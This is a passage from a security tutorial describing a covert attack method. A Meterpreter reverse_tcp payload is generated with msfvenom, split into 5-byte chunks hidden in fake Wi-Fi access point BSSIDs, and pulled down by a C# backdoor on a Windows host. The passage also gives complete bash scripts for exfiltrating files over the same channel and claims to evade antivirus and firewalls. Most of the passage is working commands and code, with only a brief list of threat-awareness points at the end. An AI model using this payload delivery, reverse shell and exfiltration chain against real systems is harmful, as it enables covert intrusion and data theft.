our Meterpreter Payload was started. In this case my Meterpreter Payload was 510 bytes\n\r\n\rso with airbase-ng command you can injecting 5 bytes of payload to BSSID for our Fake Access with name “Fake”.\n\r\n\r \n\r\n\rso we should have 102 lines for Injecting all payload by airbase-ng command to BSSID.\n\r\n\r102 * 5 = 510 bytes\n\r\n\rNote : each BSSID contains 5 bytes of payload.\n\r\n\rBSSID  = 00:fc:48:83:e4:f0 \n\r\n\r \n\r\n\r{5 bytes} ==&gt; fc-48-83-e4-f0\n\r\n\r \n\r\n\rIn this case two BSSID Mac-Address should be added to this script1.sh file\n\r\n\ras you can see in Picture A , my Script had in line 2 this MAC-Address 00:ff:ff:ff:ff:ff , this Mac-Address or BSSID is flag for Attack starting and Transferring Traffic to Infected system also you can see in picture B this file should be finished by this BSSID {00:ff:00:ff:00:ff}\n\r\n\r \n\r\n\rBSSID Flag for Start  =  00:ff:ff:ff:ff:ff\n\r\n\rBSSID Flag for Finish = 00:ff:00:ff:00:ff\n\r\n\rBSSID Injection Loop : changing BSSID (102 + 2) = 104 Times .\n\r\n\r  \n\r\n\rPicture B:\n\r\n\ralso you can see second script script2.sh file like Picture C , in this file you can use Loop command like (For) or you can make something like this Picture .\n\r\n\r Picture C: \n\r\n\rin this file \"script2.sh\" you should killing airbase-ng for 104 times at least .\n\r\n\r \n\r\n\rnow I want to explain this method step by step by my Tool ( NativePayload_BSSID.exe ) :\n\r\n\r \n\r\n\rStep by Step :\n\r\n\rstep 0 : making Wlan0mon (Monitor mode) .\n\r\n\rsyntax : airmon-ng start wlan0\n\r\n\r  \n\r\n\rstep 1 : you should make one payload for your backdoor with this command :\n\r\n\r \n\r\n\rmsfvenom -a x86_64  --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c &gt; payload.txt\n\r\n\r\n\r\n\rstep 2 : in this step you should replace your payload from this format “\\xfc\\x48\\x83\\xe4” to “fc4883e4” in payload.txt file.\n\r\n\ryou can use switch “help” for this tool for showing all syntax , like Picture 1:\n\r\n\r Picture 1: \n\r\n\rnow you should copy your Payload string and paste that by switch NULL for NativePayload_BSSID , like Picture 1-1:\n\r\n\r \n\r\n\rsyntax : c:\\&gt; NativePayload.exe null “fc4883e4...” \n\r\n\rPicture 1-1:\n\r\n\r \n\r\n\rnow you should copy all these line to one bash script for example “script1.sh” file\n\r\n\r \n\r\n\rNote : copy and paste only airbase-ng command lines to script1.sh file \n\r\n\rin this case these lines should be 102 lines + 2 = 104 lines\n\r\n\rlike picture A you should add manually this “#!/bin/bash” in first line of script so now you should have 105 lines in this file.\n\r\n\r \n\r\n\rstep 3: in this step you should run this Script1.sh in Linux side . Don\'t worry its ok !.\n\r\n\rChange chmod and run this script like picture 2:Picture 2: \n\r\n\rstep 4: in this step you should make script2.sh and change chmod for this script but not necessary to run this script in this (step4) like picture 3.\n\r\n\r  \n\r\n\rPicture 3:\n\r\n\r \n\r\n\rNote: you should make this bash script manually like Picture C. \n\r\n\r \n\r\n\rstep 5: in this step you should run your Backdoor in this case NativePayload_BSSID.exe tool , as you can see in Picture 4 , I made Meterpreter Listener in kali linux for IPAddress 192-168-1-50 and “script1.sh” executed.\n\r\n\rSo we have these Steps in step 5\n\r\n\r \n\r\n\r\n\r•Step AA : Meterpreter Listener executed (linux) \n\r\n\r\n\r• \n\r\n\r\n\r•Step BB : script1.sh should be run (linux) \n\r\n\r\n\r• \n\r\n\r\n\r•Step CC : Backdoor “NativePayload_BSSID.exe” should be run (Windows) \n\r\n\r\n\r• \n\r\n\r\n\r•Step DD : script2.sh should be run (linux) \n\r\n\r\n\r \n\r\n\rStep CC : in this time you should execute this Backdoor NativePayload_BSSID with this syntax like picture 4\n\r\n\r \n\r\n\rNativePayload_BSSID.exe “essid”\n\r\n\r \n\r\n\rin this case our ESSID in script1.sh is “Fake” so correct syntax is :\n\r\n\r \n\r\n\rc:\\&gt; NativePayload_BSSID.exe “Fake”\n\r\n\r \n\r\n\ras you can see in picture 4 , these steps performed (AA , BB and CC)Picture 4: \n\r\n\ras you can see in Picture 4 , Backdoor executed by user \"u1\" in this case then you should run “script2.sh” (step DD) like picture 4.\n\r\n\r \n\r\n\rin this time Backdoor Code will try to Scanning ESSID “Fake” on AIR then dump BSSID for “Fake” Access Point so as you can see in Picture 4 my code Dumped 4 times this BSSID “00:ff:ff:ff:ff:ff” , this BSSID is flag for Starting Attack and Transferring Payloads by BSSID .\n\r\n\r \n\r\n\rSo on AIR we have something like these steps: \n\r\n\rNow time is to Running script2.sh (Step DD)\n\r\n\rafter run this Script2.sh for each 15 Sec this script will kill one Airbase-ng Command from your Script1.sh file.\n\r\n\rso on AIR in this step after run this Script2.sh we have something like these steps :\n\r\n\r as you can see in Picture 5 my Backdoor Dumped BSSIDs after “script2.sh” .  \n\r\n\rPicture 5: Transferring Backdoor Payload by BSSID and Wireless Traffic\n\r\n\r \n\r\n\ras you can see in picture 6 you will have meterpreter session after 30 minutes .\n\r\n\r Picture 6: \n\r\n\ras you can see we have Established Meterpreter Session by my C# code and my Kaspersky 2017 Anti-virus bypassed by this method again and again and again , finally meterpreter Session Established.\n\r\n\r \n\r\n\rNote : in picture 7 you can see my code Made Establish Meterpreter session Connection after 15 sec delay , this delay was for my code. \n\r\n\rPicture 7:\n\r\n\r \n\r\n\r\n\r\n\rImportant Points for Code : \n\r\n\rin this section of code you can have BSSID list on AIR via  wlanIface.Scan(); Wireless Access Points scanning  .\n\r\n\r \n\r\n\r  foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {                       \n\r\n\r                        System.Threading.Thread.Sleep(1000);                        \n\r\n\r                        Wlan.WlanBssEntry[] BSSLIST = wlanIface.GetNetworkBssList();                        \n\r\n\r                        try\n\r\n\r                        {                          \n\r\n\r                            wlanIface.Scan();                           \n\r\n\r                        }\n\r\n\r                        catch (Exception x1)\n\r\n\r                        {\n\r\n\r                            Console.WriteLine(\"x1: \" + x1.Message);                      \n\r\n\r                        }\n\r\n\r \n\r\n\r \n\r\n\rin this section of code with Temp_filter you can Find your Target “Fake AP” \n\r\n\rso with color\'s you can figure out  which one of your Output was for which Section of code .\n\r\n\rDetecting BSSID : 00 59 54 0C 4A CC ESSID : Fake\n\r\n\rDetecting BSSID : 00 F9 9C 1B 00 AB ESSID : Fake\n\r\n\r \n\r\n\ritem.dot11Bssid == &gt;  00 59 54 0C 4A CC\n\r\n\ritem.dot11Ssid == &gt;  Fake\n\r\n\r \n\r\n\r  foreach (Wlan.WlanBssEntry item in BSSLIST)\n\r\n\r                        {\n\r\n\r                            string temp_filter = GetStringForSSID(item.dot11Ssid);\n\r\n\r                            if (temp_filter == filter_bssid)\n\r\n\r                            {                               \n\r\n\r                                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                                Console.Write(\"Detecting BSSID :\");\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                foreach (var item2 in item.dot11Bssid)\n\r\n\r                                {\n\r\n\r                                    Console.Write(\" {0}\", item2.ToString(\"x2\"));\n\r\n\r                                    Temp_BSSID += item2.ToString(\"x2\");\n\r\n\r                                }\n\r\n\r                                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                                Console.Write(\" ESSID :\");\n\r\n\r                                Console.Write(\" \" + GetStringForSSID(item.dot11Ssid));                                \n\r\n\r                            }\n\r\n\r \n\r\n\rNow in this section of code I want to talk about this Code byte[] _X_Bytes = new byte[MacAddress.Capacity * 5]; \n\r\n\r                    byte[] _X_Bytes = new byte[MacAddress.Capacity * 5];\n\r\n\r                    int b = 0;\n\r\n\r                    foreach (string X_item in MacAddress)\n\r\n\r                    {\n\r\n\r                        for (int i = 0; i &lt;= 8; )\n\r\n\r                        {\n\r\n\r                            _X_Bytes[b] = Convert.ToByte(\"0x\" + X_item.ToString().Substring(i, 2), 16);\n\r\n\r                            b++;\n\r\n\r                            i++; i++;\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r \n\r\n\rand why I used “MacAddress.Capacity * 5” : because each MAC Address has 5 bytes of your Meterpreter Payload so if you have 3 Mac-Address it means you have 3 * 5 = 15 Bytes of Payload.\n\r\n\rMac Addresses :\n\r\n\r00 59 54 0C 4A CC == &gt; 00 + “59 54 0C 4A CC” is your payload.\n\r\n\r00 0C 36 F0 82 A7 == &gt; 00 + “0C 36 F0 82 A7” is your payload.\n\r\n\r00 FC 04 B0 99 10 == &gt; 00 + “FC 04 B0 99 10” is your payload.\n\r\n\r \n\r\n\rYour 15 Bytes Payload : 59 54 0C 4A CC 0C 36 F0 82 A7 FC 04 B0 99 10\n\r\n\r \n\r\n\r \n\r\n\rLinux systems and DATA Transferring - Exfiltration via BSSID by Wireless Traffic - PART1\n\r\n\r \n\r\n\rin this time I want to talk about Linux without using “C# Code” for this method so in this case we have 2 Linux systems for Transferring or Exfiltration DATA via BSSID and Wireless Traffic.\n\r\n\r \n\r\n\rExfiltration meaning : how you can Upload/Download DATA from one system to another systems via Wireless Traffic WITHOUT User-pass (on AIR).\n\r\n\r \n\r\n\rBefore everything you can see in “Picture 8” my test for this method with using Script on one Linux system  with 2 Wireless Network cards “Wlan0” and “Wlan2”.\n\r\n\r \n\r\n\rNote: “Wlan2mon” is Monitor Mode for “Wlan2” , you can have this Mode with this Command :\n\r\n\rCommand : airmon-ng start wlan2\n\r\n\r  \n\r\n\rPicture 8:\n\r\n\r \n\r\n\ras you can see in “Picture 8” we have DATA.txt file and for Exfiltration this File via Wireless Traffic first of all you should check this String with this command “Using xxd”:\n\r\n\rwith “xxd” you can chunk these bytes for this string via “-c” in this case you should chunk this file to 5 bytes so your command should be “xxd -c 5”.\n\r\n\r \n\r\n\rwhy 5 bytes ? \n\r\n\rroot@kali:~# echo \"Exfiltration DATA via BSSID-Wireless Traffic\" &gt; DATA.txt\n\r\n\rroot@kali:~# cat DATA.txt | xxd -c 5\n\r\n\r00000000: 4578 6669 6c  Exfil\n\r\n\r00000005: 7472 6174 69  trati\n\r\n\r0000000a: 6f6e 2044 41  on DA\n\r\n\r0000000f: 5441 2076 69  TA vi\n\r\n\r00000014: 6120 4253 53  a BSS\n\r\n\r00000019: 4944 2d57 69  ID-Wi \n\r\n\r0000001e: 7265 6c65 73  reles \n\r\n\r00000023: 7320 5472 61  s Tra\n\r\n\r00000028: 6666 6963 0a  ffic.\n\r\n\r \n\r\n\rInjecting Bytes to BSSID :\n\r\n\r00000000: 4578 6669 6c  Exfil  == 5 Bytes =&gt;  00 + 45:78:66:69:6c  Exfil  ==  MAC-Address BSSID =&gt;  00:45:78:66:69:6c\n\r\n\r00000005: 7472 6174 69  trati   == 5 Bytes =&gt;  00 + 74:72:61:74:69  trati  ==  MAC-Address BSSID =&gt;  00:74:72:61:74:69\n\r\n\r \n\r\n\rProblem for injecting bytes to MAC Addresses :\n\r\n\r \n\r\n\rroot@kali:~# echo \"Exfiltration DATA via BSSID-Wireless Traffic 01\" &gt; DATA1.txt\n\r\n\rroot@kali:~# cat DATA1.txt | xxd -c 5\n\r\n\r00000000: 4578 6669 6c  Exfil\n\r\n\r00000005: 7472 6174 69  trati\n\r\n\r0000000a: 6f6e 2044 41  on DA\n\r\n\r0000000f: 5441 2076 69  TA vi\n\r\n\r00000014: 6120 4253 53  a BSS\n\r\n\r00000019: 4944 2d57 69  ID-Wi\n\r\n\r0000001e: 7265 6c65 73  reles\n\r\n\r00000023: 7320 5472 61  s Tra\n\r\n\r00000028: 6666 6963 20  ffic \n\r\n\r0000002d: 3031 0a       01.\n\r\n\r \n\r\n\ras you can see with file DATA1.txt we have Problem , because our \"RED color\" String with 5 bytes will have something like this :\n\r\n\r \n\r\n\rInjecting Bytes to BSSID :\n\r\n\r \n\r\n\r0000002d: 3031 0a       01.\n\r\n\r0000002d: 3031 0axx yy  01.XY  == 5 Bytes =&gt;  00 + 30:31:0a:xx:yy  01.xy  ==  MAC-Address BSSID =&gt;  00:30:31:0a:xx:yy\n\r\n\r \n\r\n\rFixing Problem : your [String.length + 1 % 5 = 0 ]   “should be equal 0 Always”\n\r\n\r \n\r\n\r“Exfiltration DATA via BSSID-Wireless Traffic 0100”.length = 49 + 1 = 50 / 5 ==&gt; 10 lines or 10 BSSIDs or [ (10 * (5 bytes)) – 1]\n\r\n\r \n\r\n\rwhat is this “+ 1” ? \n\r\n\r it means (your bytes) + “0a” \n\r\n\r  0000002d: 3031 3030 0a  0100.\n\r\n\r \n\r\n\rroot@kali:~# echo \"Exfiltration DATA via BSSID-Wireless Traffic 0100\" &gt; DATA.txt\n\r\n\rroot@kali:~# cat DATA.txt | xxd -c 5\n\r\n\r00000000: 4578 6669 6c  Exfil\n\r\n\r00000005: 7472 6174 69  trati\n\r\n\r0000000a: 6f6e 2044 41  on DA\n\r\n\r0000000f: 5441 2076 69  TA vi\n\r\n\r00000014: 6120 4253 53  a BSS\n\r\n\r00000019: 4944 2d57 69  ID-Wi\n\r\n\r0000001e: 7265 6c65 73  reles\n\r\n\r00000023: 7320 5472 61  s Tra\n\r\n\r00000028: 6666 6963 20  ffic \n\r\n\r0000002d: 3031 3030 0a  0100.\n\r\n\r \n\r\n\rInjecting Bytes to BSSID :\n\r\n\r \n\r\n\r0000002d: 3031 3030 0a  0100.\n\r\n\r0000002d: 3031 30300a  0100.  == 5 Bytes =&gt;  00 + 30:31:30:30:0a  0100.  ==  MAC-Address BSSID =&gt;  00:30:31:30:30:0a\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rTransfer DATA/Payload via BSSID and Wireless Traffic (Linux only) Step by step : \n\r\n\rnow I want to explain this method via Script step by step so I made 4 Simple Scripts for doing this method on linux without using C#.\n\r\n\r \n\r\n\rStep 0:  Creating Wlan Monitor Mode for Fake Access Point (Client side)\n\r\n\rfirst of all you need to create Fake AP via Monitor Mode by “airmon-ng” command\n\r\n\r \n\r\n\rCommand : airmon-ng start wlan0\n\r\n\r \n\r\n\rwith this command you will have “Wlan0mon” Network interface “Monitor Mode”\n\r\n\r \n\r\n\rStep 1 (Client side) : \n\r\n\rnow  with “Client_Exfiltration_via_FakeAP.sh” Script you can Injecting Payloads to MAC-Address or BSSID for Fake AP.\n\r\n\r \n\r\n\rHow ? \n\r\n\rWith this script you can have “New Script” to create Fake AP :\n\r\n\r \n\r\n\rSyntax : ./Client_Exfiltration_via_FakeAP.sh “Data.txt”  “Fake_AP_Name”  “Wlan0mon” &gt; “New Script.sh”\n\r\n\r \n\r\n\rData.txt : this is your payload file for exfiltration and Injecting text to MAC-Addresses\n\r\n\rFake_AP_Name : this is your name for Fake AP\n\r\n\rWlan0mon : this is your Name for Wlan “Monitor Mode” in this case “Wlan0mon”\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rClient_Exfiltration_via_FakeAP.sh\n\r\n\r #!/bin/sh\n\r\n\recho \" #!/bin/sh\"\n\r\n\rfor bytes in `xxd -p -c 5 $1 | sed \'s/../&amp;:/g\'`; \n\r\n\r do\n\r\n\r   Exfil=`echo $bytes | sed \'s/:$/ /\'`\n\r\n\r   text=`echo $Exfil | xxd -r -p`\n\r\n\r   echo \"#Injecting text: \" \\\"$text\\\" \"to Mac via BSSID\" 00:$Exfil \"for FAKE AccessPoint: \" $2  \n\r\n\r   echo \"airbase-ng -a \" 00:$Exfil  \" --essid\" $2 \"-I 10 -0 \" $3 \" ;\"\n\r\n\r   echo  \n\r\n\r done\n\r\n\r \n\r\n\ras you can see in “Picture 9” you can have New Script via “Client_Exfiltration_via_FakeAP.sh“ with name “Client_Script.sh”.\n\r\n\r \n\r\n\r./Client_Exfiltration_via_FakeAP.sh Data.txt  Fake  Wlan0mon &gt;  Client_Script.sh\n\r\n\rchmod 775  Client_Script.sh\n\r\n\r Picture 9: \n\r\n\rand this is your output from “Step 1” Command.\n\r\n\r \n\r\n\rClient_Script.sh\n\r\n\r #!/bin/sh\n\r\n\r#Injecting text:  \"Exfil\" to Mac via BSSID 00:45:78:66:69:6c for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:45:78:66:69:6c  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"trati\" to Mac via BSSID 00:74:72:61:74:69 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:74:72:61:74:69  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"on DA\" to Mac via BSSID 00:6f:6e:20:44:41 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:6f:6e:20:44:41  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"TA vi\" to Mac via BSSID 00:54:41:20:76:69 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:54:41:20:76:69  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"a BSS\" to Mac via BSSID 00:61:20:42:53:53 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:61:20:42:53:53  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"ID-Wi\" to Mac via BSSID 00:49:44:2d:57:69 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:49:44:2d:57:69  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"reles\" to Mac via BSSID 00:72:65:6c:65:73 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:72:65:6c:65:73  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"s Tra\" to Mac via BSSID 00:73:20:54:72:61 for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:73:20:54:72:61  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r#Injecting text:  \"ffic\" to Mac via BSSID 00:66:66:69:63:0a for FAKE AccessPoint:  Fake\n\r\n\rairbase-ng -a  00:66:66:69:63:0a  --essid Fake -I 10 -0  wlan0mon  ;\n\r\n\r \n\r\n\rStep 1-1 (Client side) : \n\r\n\rnow you have this new Script “Client_Script.sh” and you can run this new script Client_Script.sh with this Syntax :\n\r\n\r \n\r\n\r./Client_Script.sh | grep started\n\r\n\r \n\r\n\rNote : after step 1-1 you will see Fake Access-Point with Name “Fake” with First Injected BSSID “00:45:78:66:69:6c“.\n\r\n\r \n\r\n\rStep 2 (Client side) : \n\r\n\rnow this “Client_Script.sh” is ready and executed but for Transferring DATA via Wireless Traffic on AIR you need to Execute this Script with another Script called “Client_killAP.sh”\n\r\n\r \n\r\n\rClient_killAP.sh\n\r\n\r#!/bin/bash\n\r\n\rc=1\n\r\n\rwhile [ $c -le $1 ]\n\r\n\rdo\n\r\n\r  sleep 10 ;\n\r\n\r  killall airbase-ng ;\n\r\n\r  echo $c \" Killing airbase-ng Process Done\";\n\r\n\r  ((c++))\n\r\n\rdone\n\r\n\r \n\r\n\rwith this Script your airbase-ng Process will kill by “killall” Command every “10 Sec”  , it means your Fake Access-Point BSSID will change Every “10 Sec” also it means your Payloads will Send on AIR every “10 Sec” via “wlan2mon”.\n\r\n\r \n\r\n\rSo in this “Step 2” your Command syntax is : ./Client_killAP.sh “Time-Seconds”\n\r\n\r \n\r\n\r./Client_killAP.sh 10\n\r\n\r \n\r\n\ras you can see in “Picture 10” first you should execute Client_Script.sh then you can execute Client_killAP.sh\n\r\n\r  \n\r\n\rPicture 10:\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rStep 2-1 (Server side) :\n\r\n\rNow in this step you should execute this script “Server_iwlist_Scan.sh” .\n\r\n\rWith This script you will have list of APs via Scanning Access-Points on AIR by “iwlist” Command.\n\r\n\r \n\r\n\r \n\r\n\rServer_iwlist_Scan.sh\n\r\n\r #!/bin/sh\n\r\n\rx=1\n\r\n\rwhile [ $x -le $1 ]\n\r\n\r do\n\r\n\r  echo $x\n\r\n\r  ((x++))\n\r\n\r  echo `iwlist \'wlan0\' \'scan\' | grep -e \"Address: 00:\"` &gt;&gt; $2 ;\n\r\n\r  echo \"iwlist AP List Dumped to file\" $2;\n\r\n\r  sleep 6 ;\n\r\n\r done\n\r\n\rfold -w37 $2 &gt; output.txt ;\n\r\n\recho \"AP List saved in output.txt file\"\n\r\n\recho\n\r\n\rcat output.txt\n\r\n\r \n\r\n\rImportant Points : important Points for this Code “Server_iwlist_Scan.sh” are 3 Sections :\n\r\n\r \n\r\n\r1.  echo `iwlist \'wlan0\' \'scan\' | grep -e \"Address: 00:\"` &gt;&gt; $2 ;\n\r\n\rwith this code you can have Access-Points List via Scanning on Air by iwlist command but this Section is very important \"| grep -e \"Address: 00:\"\" because we need just those BSSIDs of list with this Condition : if started with \"Address: 00:\" so we need this filter to Detecting Correct BSSIDs.\n\r\n\r \n\r\n\r2. sleep 6 ;\n\r\n\rthis sleep time was good for my test but you can change it because your Client Side Script will work with Sleeping with time \"10 sec delay\" for changing each Fake BSSID. So in my opinion your Delay or sleep time for Scanning Access-Points on Air should be something between 6 up to 8.\n\r\n\r \n\r\n\r3. fold -w37 $2 &gt; output.txt ;\n\r\n\rwith this code you will Insert \"\\n\" after each \"37\" char also saving this result to output.txt file , it means you will chunk your Result from \"iwlist\".\n\r\n\r \n\r\n\rAs you can see in “Picture 10” we have this Command in “server side”\n\r\n\r \n\r\n\rsyntax : ./Server_iwlist_Scan.sh  retry_number   TempFile.txt \n\r\n\r \n\r\n\r./Server_iwlist_Scan.sh  10  mytemp.txt  |  grep  -e Dumped  -e saved\n\r\n\r \n\r\n\rit means we want to Scan Access-Points List “10” times with Delay “6” also Dumping all BSSIDs to “mytemp.txt” file so we will have something like this file in “Picture 11” : \n\r\n\rPicture 11:\n\r\n\r \n\r\n\rwith this code you fold -w37 $2 &gt; output.txt ; you can Change  “mytemp.txt” file from “Picture 11” to this file “output.txt” like “Picture 12”.\n\r\n\r Picture 12: \n\r\n\rStep 3 (Server side) :\n\r\n\rFinally in this step you have “output.txt” now with this Script you can Dump your DATA behind these BSSIDs via this script “Server_GetData_via_BSSID.sh” and this syntax :\n\r\n\r \n\r\n\r./Server_GetData_via_BSSID.sh  output.txt\n\r\n\r \n\r\n\ras you can see in “Picture 10” with this script you will have DATA Exfiltration via BSSID and Wireless Traffic “without User-Pass”.\n\r\n\r \n\r\n\rServer_GetData_via_BSSID.sh\n\r\n\r #!/bin/sh \n\r\n\r fold -w37 $1 &gt; AP_Info_list.txt;\n\r\n\r awk {\'print $5\'} AP_Info_list.txt &gt; BSSID_List.txt;\n\r\n\r \n\r\n\r  for ops in `awk \'!a[$0]++\' BSSID_List.txt | xxd -p`; \n\r\n\r        do\n\r\n\r        ops1=`echo $ops | xxd -r -p`\n\r\n\r        ops2=`echo $ops | xxd -r -p | xxd -r -p`\n\r\n\r        echo $ops1 \"==&gt;\" $ops2\n\r\n\r        done\n\r\n\r   echo\n\r\n\r   echo \"[;)] your Injected Bytes via Mac Addresses: \"\n\r\n\r   echo `awk \'!a[$0]++\' BSSID_List.txt`\n\r\n\r   echo\n\r\n\r   echo \"[;o] your Data : \"\n\r\n\r   echo\n\r\n\r   echo `awk \'!a[$0]++\' BSSID_List.txt | xxd -r -p`\n\r\n\r \n\r\n\rNote : if you want to Run this script more than 1 time Remember this Point you should Remove “mytemp.txt” file before running next Test or in “step 2-1” you should use new file name for creating New File for example “mytemp2.txt”\n\r\n\rNote : you can compare “Picture 8” with “Picture 10” and you can see in “Picture 10” I got “Error“ or I have something bad in my Result anyway I should say in “Picture 8” my test was on Single system with 2 Wireless cards and in “Picture 10” my test was on two Systems as you can see one of them is Virtual Machine.\n\r\n\r \n\r\n\rLinux systems and DATA Transferring - Exfiltration via BSSID by Wireless Traffic – PART2\n\r\n\r \n\r\n\rin this time I want to talk about “NativePayload_BSSID.sh” script step by step. I made this script by Codes from PART1.\n\r\n\rFor using this Script you can use Switch help via this syntax :\n\r\n\r \n\r\n\r./NativePayload_BSSID.sh help\n\r\n\r \n\r\n\rExample Step1: (Client Side ) ./NativePayload_BSSID.sh -f text-file Fake-AP-Name MonitorMode-Interface\n\r\n\rExample Step2: (Server Side ) ./NativePayload_BSSID.sh -s wlanx Exfil-Dump-file\n\r\n\r \n\r\n\rexample System A : ./NativePayload_BSSID.sh -f mytext.txt myfakeAP Wlan3mon\n\r\n\rexample System B : ./NativePayload_BSSID.sh -s wlan0 ExfilDumped.txt\n\r\n\r \n\r\n\ras you can see in “Picture 13” I used this Script via two Wireless Adapter: “Wlan0” and “Wlan3mon (Monitor Mode for Wlan3)”\n\r\n\r \n\r\n\r Picture 13:  \n\r\n\rsyntax (step 1) : ./NativePayload_BSSID.sh  -f  text1.txt  MyfakeAP  wlan3mon\n\r\n\r \n\r\n\rwith “switch -f” you can have injected BSSID for your Fake-AP-Name over wlan3mon and this BSSID will change every (10 sec) , it means with this switch you want to Send this text file “test1.txt” from “system A” to “system B” via Wireless Traffic and “system B” will dump these BSSID via Scanning AIR , in this step on “system B” you can use “Switch -s”  for Scanning AIR so with this syntax you can dump this “text1.txt” file very simple : \n\r\n\r \n\r\n\rsyntax (step 2) : ./NativePayload_BSSID.sh  -s  wlan0  exfildump.txt\n\r\n\r Picture 14: \n\r\n\ras you can see in “Picture 14” file text1.txt dumped via Scanning BSSID on AIR after (1:51 min) with delay (10 sec)\n\r\n\r \n\r\n\rat a glance : your Wireless Devices are vulnerable always so you should re-think about these threats:\n\r\n\r1.malware or backdoor Payload injection to BSSID for Wifi Device and Transferring by Wireless Traffic is possible.\n\r\n\r2.if you want to use WIFI device for your Clients and your Network infrastructure you should know about these threats\n\r\n\r3. in this method your infected system always is vulnerable until your Wifi Card is on and maybe one day your clients attacked with Wifi card by attacker Cell phones and Fake AP …..\n\r\n\r4.in this case my Backdoor try to scan ESSIDs for example “Fake” for dumping BSSID so this traffic will work very slowly and quietly too.\n\r\n\r5.your Anti-viruses can\'t detect this one and your firewall in LAN/WAN bypassed because we have not any traffic via these infrastructures , in this case we have direct Traffic between Infected system Wifi Card and Attacker system Wifi Card on AIR also after payload dumped by backdoor we will have Reverse_tcp Meterpreter session traffic from Infected system to Attacker system by LAN/WAN without Wifi-Card so in this case again we have outgoing traffic from Backdoor system to attacker system over Internet or LAN and this traffic the most time will not block by windows firewall or ….\n\r\n\r \n\r\n\rC# source code : https://github.com/DamonMohammadbagher/NativePayload_BSSID\n\r\n\rC# Video : https://youtu.be/W0dJGln3tls\n\r\n\r \n\r\n\rAll Scripts and C# Code : \n\r\n\r \n\r\n\rClient_Exfiltration_via_FakeAP.sh\n\r\n\r #!/bin/sh\n\r\n\recho \" #!/bin/sh\"\n\r\n\rfor bytes in `xxd -p -c 5 $1 | sed \'s/../&amp;:/g\'`; \n\r\n\r do\n\r\n\r   Exfil=`echo $bytes | sed \'s/:$/ /\'`\n\r\n\r   text=`echo $Exfil | xxd -r -p`\n\r\n\r   echo \"#Injecting text: \" \\\"$text\\\" \"to Mac via BSSID\" 00:$Exfil \"for FAKE AccessPoint: \" $2  \n\r\n\r   echo \"airbase-ng -a \" 00:$Exfil  \" --essid\" $2 \"-I 10 -0 \" $3 \" ;\"\n\r\n\r   echo  \n\r\n\r done\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rClient_killAP.sh\n\r\n\r#!/bin/bash\n\r\n\rc=1\n\r\n\rwhile [ $c -le $1 ]\n\r\n\rdo\n\r\n\r  sleep 10 ;\n\r\n\r  killall airbase-ng ;\n\r\n\r  echo $c \" Killing airbase-ng Process Done\";\n\r\n\r ((c++))\n\r\n\rdone\n\r\n\r \n\r\n\r \n\r\n\rServer_iwlist_Scan.sh\n\r\n\r #!/bin/sh\n\r\n\rx=1\n\r\n\rwhile [ $x -le $1 ]\n\r\n\r do\n\r\n\r  echo $x\n\r\n\r  ((x++))\n\r\n\r  echo `iwlist \'wlan0\' \'scan\' | grep -e \"Address: 00:\"` &gt;&gt; $2 ;\n\r\n\r  echo \"iwlist AP List Dumped to file\" $2;\n\r\n\r  sleep 6 ;\n\r\n\r done\n\r\n\rfold -w37 $2 &gt; output.txt ;\n\r\n\recho \"AP List saved in output.txt file\"\n\r\n\recho\n\r\n\rcat output.txt\n\r\n\r \n\r\n\rServer_GetData_via_BSSID.sh\n\r\n\r #!/bin/sh \n\r\n\r fold -w37 $1 &gt; AP_Info_list.txt;\n\r\n\r awk {\'print $5\'} AP_Info_list.txt &gt; BSSID_List.txt;\n\r\n\r \n\r\n\r  for ops in `awk \'!a[$0]++\' BSSID_List.txt | xxd -p`; \n\r\n\r        do\n\r\n\r        ops1=`echo $ops | xxd -r -p`\n\r\n\r        ops2=`echo $ops | xxd -r -p | xxd -r -p`\n\r\n\r        echo $ops1 \"==&gt;\" $ops2\n\r\n\r        done\n\r\n\r   echo\n\r\n\r   echo \"[;)] your Injected Bytes via Mac Addresses: \"\n\r\n\r   echo `awk \'!a[$0]++\' BSSID_List.txt`\n\r\n\r   echo\n\r\n\r   echo \"[;o] your Data : \"\n\r\n\r   echo\n\r\n\r   echo `awk \'!a[$0]++\' BSSID_List.txt | xxd -r -p`\n\r\n\r \n\r\n\r \n\r\n\rNativePayload_BSSID.sh\n\r\n\r #!/bin/sh\n\r\n\recho\n\r\n\recho \"NativePayload_BSSID.sh , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting/Downloading/Uploading DATA via BSSID (Wireless Traffic)\"\n\r\n\recho \"help syntax: ./NativePayload_BSSID.sh help\"\n\r\n\recho\n\r\n\rfunction killairbase\n\r\n\r{\n\r\n\r \n\r\n\r  sleep 10 ;\n\r\n\r  echo\n\r\n\r  killall airbase-ng ;\n\r\n\r \n\r\n\r}\n\r\n\rif [ $1 == 